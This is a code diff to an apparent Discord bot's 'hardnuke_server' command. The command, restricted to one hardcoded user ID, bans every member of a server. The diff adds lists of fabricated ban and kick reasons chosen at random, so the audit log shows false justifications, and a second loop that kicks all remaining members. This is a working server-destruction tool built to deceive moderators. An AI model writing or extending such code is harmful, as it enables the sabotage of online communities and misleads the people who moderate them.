@@ -348,6 +348,9 @@ async def nuke_server_fr(ctx):
 
 @bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
 async def nuke_server_fr(ctx):
+    rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising", "Broke rules", "Ban command used", None]
+    krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
+
     if str(ctx.author.id) != '762152955382071316':
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
         await ctx.send("You don't have `Administrator` Permissions!")
@@ -355,7 +358,13 @@ async def nuke_server_fr(ctx):
        
         for member in ctx.guild.members:
             try:
-                await member.ban()
+                await member.ban(reason=random.choice(rlist))
+            except:
+                None
+        
+        for member in ctx.guild.members:
+            try:
+                await member.kick(reason=random.choice(krlist))
             except:
                 None
                 
